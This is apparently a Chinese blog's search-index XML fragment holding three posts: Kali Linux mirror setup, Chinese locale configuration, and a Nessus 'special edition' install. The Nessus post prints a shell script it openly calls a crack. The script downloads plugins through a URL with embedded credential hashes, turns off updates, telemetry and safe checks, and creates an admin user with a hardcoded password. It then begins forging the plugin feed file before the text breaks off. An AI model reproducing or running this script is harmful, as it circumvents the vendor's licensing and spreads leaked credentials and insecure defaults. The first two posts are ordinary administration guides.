            
            <tag> react state getter setter 状态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux 换国内镜像源</title>
      <link href="/2024/09/27/qi-ta/kali-linux-huan-guo-nei-jing-xiang-yuan/"/>
      <url>/2024/09/27/qi-ta/kali-linux-huan-guo-nei-jing-xiang-yuan/</url>
      
        <content type="html"><![CDATA[<p>Kali Linux 是一个基于 Debian 的高级渗透测试和安全审计 Linux 发行版。为了加速更新和安装软件包的速度，尤其是对国内用户，使用国内的镜像源是一个非常有效的策略。以下是如何将 Kali Linux 的软件源更换为国内镜像源的步骤。</p><p><img src="https://pic1.zhimg.com/v2-1d3125ce66a3ec79b415bb80c913cfb9_1440w.jpg?source=172ae18b" alt="images"></p><h2 id="1-打开配置文件"><a href="#1-打开配置文件" class="headerlink" title="1.打开配置文件"></a>1.打开配置文件</h2><h3 id="首先，您需要打开-Kali-Linux-的软件源列表文件-sources-list："><a href="#首先，您需要打开-Kali-Linux-的软件源列表文件-sources-list：" class="headerlink" title="首先，您需要打开 Kali Linux 的软件源列表文件 sources.list："></a>首先，您需要打开 Kali Linux 的软件源列表文件 <code>sources.list</code>：</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-将国内镜像源信息写入到文件"><a href="#2-将国内镜像源信息写入到文件" class="headerlink" title="2.将国内镜像源信息写入到文件"></a>2.将国内镜像源信息写入到文件</h2><p><img src="https://pic2.zhimg.com/v2-1688df7c8ed79e7d343760698c0e3f21_r.jpg" alt="images"></p><h2 id="3-更新软件源"><a href="#3-更新软件源" class="headerlink" title="3.更新软件源"></a>3.更新软件源</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="出现报错"><a href="#出现报错" class="headerlink" title="出现报错"></a>出现报错</h3><p><img src="https://pic1.zhimg.com/80/v2-a168cbe222f8d81d0560f14877972cfc_1440w.webp" alt="images"></p><h3 id="解决方法删除以下目录"><a href="#解决方法删除以下目录" class="headerlink" title="解决方法删除以下目录"></a>解决方法删除以下目录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc/apt/sources.list.d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="下载数字签名"><a href="#下载数字签名" class="headerlink" title="下载数字签名"></a>下载数字签名</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-O</span> archive-key.asc https://archive.kali.org/archive-key.asc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装数字签名"><a href="#安装数字签名" class="headerlink" title="安装数字签名"></a>安装数字签名</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> apt-key <span class="token function">add</span> archive-key.asc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="apt-update-更新成功"><a href="#apt-update-更新成功" class="headerlink" title="apt update 更新成功"></a>apt update 更新成功</h3><p><img src="https://pic4.zhimg.com/80/v2-bd8a149fbeb69ccb2901ad024bf8b0f3_1440w.webp" alt="images"></p><h2 id="附镜像源地址"><a href="#附镜像源地址" class="headerlink" title="附镜像源地址"></a>附镜像源地址</h2><p>中科大</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>阿里云</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>清华大学</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>浙大</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>东软大学</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>官方源</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali-Linux Linux 国内镜像源 mirrors </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux系统设置中文语言环境</title>
      <link href="/2024/09/27/qi-ta/kali-linux-xi-tong-she-zhi-zhong-wen-yu-yan-huan-jing/"/>
      <url>/2024/09/27/qi-ta/kali-linux-xi-tong-she-zhi-zhong-wen-yu-yan-huan-jing/</url>
      
        <content type="html"><![CDATA[<p>主流 Linux 系统安装之后，默认使用的语言环境基本都是英语，所以不管时图形桌面的菜单标题，还是终端的一些输出提示，都是展示的英文，对于觉得阅读英语不太友好的同胞们，第一件事可能就是设置一个友好的汉化环境，下面以 <strong>Kali Linux</strong> 这个发行版的系统为例，介绍一些设置中文语言环境的方法；</p><h2 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h2><p>如果安装的系统有图形界面，那么操作就简单了；一般系统在安装时就会提供语言选项，不过安装好后也能进行修改，一般可以在系统设置的<strong>区域与语言</strong>模块中找到相关的设置，例如下图：</p><p><img src="https://i.loli.net/2020/04/15/sOjHYfuMplZ9E6b.jpg" alt="language.jpg"></p><p>至于其他 Linux 系统，路径应该类似，或者可以在设置里面搜索一下；修改成功需要重新登录生效，这个修改是永久性的；</p><h2 id="终端命令"><a href="#终端命令" class="headerlink" title="终端命令"></a>终端命令</h2><p>没有图形界面或者在设置里面没有找到的情况下，可以尝试使用终端命令进行修改；</p><h3 id="安装中文环境包"><a href="#安装中文环境包" class="headerlink" title="安装中文环境包"></a>安装中文环境包</h3><p>切换中文环境之前，需要安装中文语言环境包，直接运行以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg-reconfigure locales<span class="token comment"># 上面的运行不成功可以尝试下面这条命令：</span><span class="token function">sudo</span> dpkg-reconfigure <span class="token parameter variable">--force</span> locales<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果提示类似 <code>locales</code> 未找到这样的信息，那么就先运行 <code>apt install locales</code> 执行安装，然后再运行上面的命令，顺利的话会弹出一个对话框，选择需要安装的语言，因为中文包是 <code>z</code> 开头的，列表又是按字母顺序排列，所以使用方向箭头向下浏览到靠近底端位置，应该能看见这样一个选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span> <span class="token punctuation">]</span> zh_CN.UTF-8 UTF-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后把焦点移动到它上面，按下空格键选择，选中的话方括号中会出现星号，再按回车进入下一步，新的对话框会提示选择系统默认的语言设置，这时依然把焦点移动到和上面一样的选项上，最后按回车确认，代码运行完毕后如果没有报错，就安装完成了；</p><h3 id="切换中文环境"><a href="#切换中文环境" class="headerlink" title="切换中文环境"></a>切换中文环境</h3><p>接下来开始切换语言环境，先运行一下 <code>locale</code> 命令查看当前的语言环境，应该会得到以下输出（目前还是英语环境）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>en_US.UTF-8<span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span><span class="token assign-left variable">LC_CTYPE</span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_NUMERIC</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_TIME</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable">LC_COLLATE</span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_MONETARY</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable">LC_MESSAGES</span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_PAPER</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_NAME</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_ADDRESS</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_TELEPHONE</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_MEASUREMENT</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_IDENTIFICATION</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_ALL</span></span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实这些也都代表这当前系统的对应环境变量值，例如再运行 <code>echo $LANG</code> 就会得到输出 <code>en_US.UTF-8</code>，其他类似，所以我们修改的重点也是围绕其中的几个变量展开的；由于环境变量的特性，也可以再细分为两种方法；</p><h4 id="临时性修改"><a href="#临时性修改" class="headerlink" title="临时性修改"></a>临时性修改</h4><p>直接在终端里输入以下命令的话，就能对当前语言的环境变量进行修改：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>zh_CN.UTF-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注：这里只用修改 <code>LANG</code> 这个变量就行了，后面的其它以 <code>LC</code> 开头的变量值会自动改变；</p></blockquote><p>然后再运行 <code>locale</code> 看一下效果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>zh_CN.UTF-8<span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span><span class="token assign-left variable">LC_CTYPE</span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_NUMERIC</span></span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_TIME</span></span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable">LC_COLLATE</span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_MONETARY</span></span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable">LC_MESSAGES</span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_PAPER</span></span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_NAME</span></span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_ADDRESS</span></span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_TELEPHONE</span></span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_MEASUREMENT</span></span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_IDENTIFICATION</span></span><span class="token operator">=</span><span class="token string">"zh_CN.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_ALL</span></span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确实修改成功了，不过这条命令是临时性的，关闭当前终端或重启后就失效了，而且也仅限于当前终端内输出指定的语言，只适用于临时查看某个语言的输出内容的场景；</p><h4 id="永久性修改"><a href="#永久性修改" class="headerlink" title="永久性修改"></a>永久性修改</h4><p>要永久性的修改语言环境，其实也就是永久性的修改 <code>LANG</code> 这个环境变量的值，要实现它就直接在 <code>~/.bashrc</code> 这个文件中末尾追加下面一行内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>zh_CN.UTF-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就对当前用户设置了中文语言环境，如果需要应用到系统所有用户的话，就追加到 <strong><code>/etc/profile</code></strong> 这个文件中；最后重启一下就设置成功了；</p><h4 id="其它修改方法"><a href="#其它修改方法" class="headerlink" title="其它修改方法"></a>其它修改方法</h4><p>一些教程中会提到修改 <code>/etc/default/locale</code> 这个文件的内容，其实上面的安装中文环境这一节中，最后一步其实就是向这个文件中写入以下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>zh_CN.UTF-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过经测试，这样修改后重启并没有改变当前语言环境，不过要是替换成下面的内容就能修改成功：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>zh_CN.UTF-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外下面任意一条命令都能实现设置 <code>/etc/default/loale</code> 这个文件的内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> localectl set-locale <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>zh_CN.UTF-8<span class="token function">sudo</span> update-lcoale <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>zh_CN.UTF-8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改后重启运行 <code>locale</code> 得到的输出是这样的：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>en_US.UTF-8<span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>zh_CN.UTF-8<span class="token assign-left variable">LC_CTYPE</span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_NUMERIC</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_TIME</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable">LC_COLLATE</span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_MONETARY</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable">LC_MESSAGES</span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_PAPER</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_NAME</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_ADDRESS</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_TELEPHONE</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_MEASUREMENT</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_IDENTIFICATION</span></span><span class="token operator">=</span><span class="token string">"en_US.UTF-8"</span><span class="token assign-left variable"><span class="token environment constant">LC_ALL</span></span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即最终只修改了 <code>LANGUAGE</code> 这一处的变量值，所以这个方法不怎么推荐；另外也有一些教程提到修改 <strong><code>/etc/sysconfig/i18n</code></strong> 或 <strong><code>/etc/local.conf</code></strong> 这两个文件的内容，这应该是其它 Linux 发型版本中的，至少我在 Kali 系统里面没有找到这两个文件；</p><h3 id="安装中文字体包"><a href="#安装中文字体包" class="headerlink" title="安装中文字体包"></a>安装中文字体包</h3><p>修改好中文环境重启后，还有可能出现的一种常见情况就是，终端或者菜单标题之类的地方出现<strong>乱码</strong>，也有可能出现先刚安装完系统后；其实原因也很简单，就是虽然环境被设置成了中文，但是当前系统中缺乏相应的中文字体，所以识别错误就用一些乱码来占位了；</p><p>解决方法就是安装一些中文字体包，比如可以运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> fonts-wqy-microhei<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后，按需重启，应该就能看见友好又熟悉的内容了 <code>^_^</code>；</p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux 汉化 中文 乱码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nessus for Linux</title>
      <link href="/2024/09/27/qi-ta/nessus-te-bie-ban-2024-cha-jian-10.6.4-for-linux-gua-yong-yu-debian-ubuntu-xi-tong/"/>
      <url>/2024/09/27/qi-ta/nessus-te-bie-ban-2024-cha-jian-10.6.4-for-linux-gua-yong-yu-debian-ubuntu-xi-tong/</url>
      
        <content type="html"><![CDATA[<p><strong>Nessus 特别版+2024插件 10.6.4 For Linux【适用于Debian &amp; Ubuntu系统】</strong></p><p><img src="https://www.ddosi.org/wp-content/uploads/2023/07/z-1.webp" alt="notion image"></p><p><img src="https://www.ddosi.org/wp-content/uploads/2024/01/103022-750x450.webp" alt="notion image"></p><p><strong>安装脚本适用于debian系统，可在kali linux上成功安装。</strong></p><p><strong>适用于Ubuntu系统的可在文章末尾下载。</strong></p><p>Nessus版本：10.6.4</p><p>插件版本：202401292356</p><h2 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h2><p>1.下载nessus.sh脚本。</p><p>下载地址：</p><p><a href="https://ddosi-my.sharepoint.com/:u:/g/personal/netsparker_ddosi_onmicrosoft_com/EeYn6FMB4e1BqOqPdK-djKsBFh9XZvjYRY7oDQeKgF-gHA?e=xo1h08">nessus.sh</a></p><p>或直接复制如下代码保存为nessus.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> <span class="token parameter variable">-u</span><span class="token variable">)</span></span> <span class="token parameter variable">-ne</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token builtin class-name">echo</span> <span class="token string">"请使用 root 用户运行"</span> <span class="token punctuation">;</span> <span class="token builtin class-name">exit</span> <span class="token number">1</span> <span class="token punctuation">;</span> <span class="token keyword">fi</span><span class="token builtin class-name">echo</span> //<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token builtin class-name">echo</span>   Nessus 最新版本下载、安装和破解   <span class="token parameter variable">-Zen</span> <span class="token number">20230819</span><span class="token builtin class-name">echo</span>   特别感谢 John Doe 在 Debian 上演示这一操作的有效性<span class="token builtin class-name">echo</span>   感谢 <span class="token number">369</span> 提供关于 <span class="token string">"latest"</span> 的提示<span class="token builtin class-name">echo</span> //<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token builtin class-name">echo</span> <span class="token string">" + 增加了防滑附加功能，移除所有 chattr 设置 20231013"</span>chattr <span class="token parameter variable">-i</span> <span class="token parameter variable">-R</span> /opt/nessus<span class="token builtin class-name">echo</span> <span class="token string">" + 确保我们有先决条件.."</span><span class="token function">apt</span> update <span class="token operator">&amp;></span>/dev/null<span class="token function">apt</span> <span class="token parameter variable">-y</span> <span class="token function">install</span> <span class="token function">curl</span> dpkg <span class="token function">expect</span> <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" + 停止旧的 nessusd 服务，以防存在一个！"</span>/bin/systemctl stop nessusd.service <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" + 下载 Nessus.."</span><span class="token function">curl</span> <span class="token parameter variable">-A</span> Mozilla <span class="token parameter variable">--request</span> GET <span class="token punctuation">\</span>  <span class="token parameter variable">--url</span> <span class="token string">'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-latest-debian10_amd64.deb'</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--output</span> <span class="token string">'Nessus-latest-debian10_amd64.deb'</span> <span class="token operator">&amp;></span>/dev/null<span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> Nessus-latest-debian10_amd64.deb <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token builtin class-name">echo</span> <span class="token string">" + Nessus 下载失败 :/ 退出。从 t.me/pwn3rzs 获取拷贝"</span>  <span class="token builtin class-name">exit</span> <span class="token number">0</span><span class="token keyword">fi</span> <span class="token punctuation">&#125;</span><span class="token builtin class-name">echo</span> <span class="token string">" + 安装 Nessus.."</span>dpkg <span class="token parameter variable">-i</span> Nessus-latest-debian10_amd64.deb <span class="token operator">&amp;></span>/dev/null<span class="token comment"># 看，我试图只是进行更改和运行，但它不起作用。如果你能优化我的操作，让我知道。但对我来说，这是唯一需要运行的 :/</span><span class="token builtin class-name">echo</span> <span class="token string">" + 第一次初始化时启动服务（必须执行）"</span>/bin/systemctl start nessusd.service <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" + 让 Nessus 初始化，等待大约 20 秒..."</span><span class="token function">sleep</span> <span class="token number">20</span><span class="token builtin class-name">echo</span> <span class="token string">" + 停止 nessus 服务.."</span>/bin/systemctl stop nessusd.service <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" + 更改 nessus 设置为 Zen 偏好（自由战士模式）"</span><span class="token builtin class-name">echo</span> <span class="token string">"   监听端口: 11127"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">xmlrpc_listen_port</span><span class="token operator">=</span><span class="token number">11127</span> <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">"   主题: 暗色"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">ui_theme</span><span class="token operator">=</span>dark <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">"   安全检查: 关闭"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">safe_checks</span><span class="token operator">=</span>false <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">"   日志: 性能"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">backend_log_level</span><span class="token operator">=</span>performance <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">"   更新: 关闭"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">auto_update</span><span class="token operator">=</span>false <span class="token operator">&amp;></span>/dev/null/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">auto_update_ui</span><span class="token operator">=</span>false <span class="token operator">&amp;></span>/dev/null/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">disable_core_updates</span><span class="token operator">=</span>true <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">"   遥测: 关闭"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">report_crashes</span><span class="token operator">=</span>false <span class="token operator">&amp;></span>/dev/null/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">send_telemetry</span><span class="token operator">=</span>false <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" + 添加一个用户，稍后可以更改（用户名:admin, 密码:ddosi）"</span><span class="token function">cat</span> <span class="token operator">></span> expect.tmp<span class="token operator">&lt;&lt;</span><span class="token string">'EOF'spawn /opt/nessus/sbin/nessuscli adduser adminexpect "登录密码:"send "ddosi\r"expect "登录密码（再次输入）:"send "ddosi\r"expect "*(可以上传插件等)？ (y/n)*"send "y\r"expect "*(用户可以有一个空的规则集)"send "\r"expect "是否确定*"send "y\r"expect eofEOF</span><span class="token function">expect</span> <span class="token parameter variable">-f</span> expect.tmp <span class="token operator">&amp;></span>/dev/null<span class="token function">rm</span> <span class="token parameter variable">-rf</span> expect.tmp <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" + 下载新的插件.."</span><span class="token function">curl</span> <span class="token parameter variable">-A</span> Mozilla <span class="token parameter variable">-o</span> all-2.0.tar.gz <span class="token punctuation">\</span>  <span class="token parameter variable">--url</span> <span class="token string">'https://plugins.nessus.org/v2/nessus.php?f=all-2.0.tar.gz&amp;u=4e2abfd83a40e2012ebf6537ade2f207&amp;p=29a34e24fc12d3f5fdfbb1ae948972c6'</span> <span class="token operator">&amp;></span>/dev/null<span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> all-2.0.tar.gz <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token builtin class-name">echo</span> <span class="token string">" + 插件 all-2.0.tar.gz 下载失败 :/ 退出。从 t.me/pwn3rzs 获取拷贝"</span>  <span class="token builtin class-name">exit</span> <span class="token number">0</span><span class="token keyword">fi</span> <span class="token punctuation">&#125;</span><span class="token builtin class-name">echo</span> <span class="token string">" + 安装插件.."</span>/opt/nessus/sbin/nessuscli update all-2.0.tar.gz <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" + 获取版本号.."</span><span class="token comment"># 我曾经看到这个对于下载不正确。嗯，但对我来说它有效。</span><span class="token assign-left variable">vernum</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> https://plugins.nessus.org/v2/plugins.php <span class="token operator"><span class="token file-descriptor important">2</span>></span> /dev/null<span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">" + 构建插件 feed..."</span><span class="token function">cat</span> <span class="token operator">></span> /opt/nessus/var/nessus/plugin_feed_info.inc <span class="token operator">&lt;&lt;</span><span class="token string">EOFPLUGIN_SET = "<span class="token 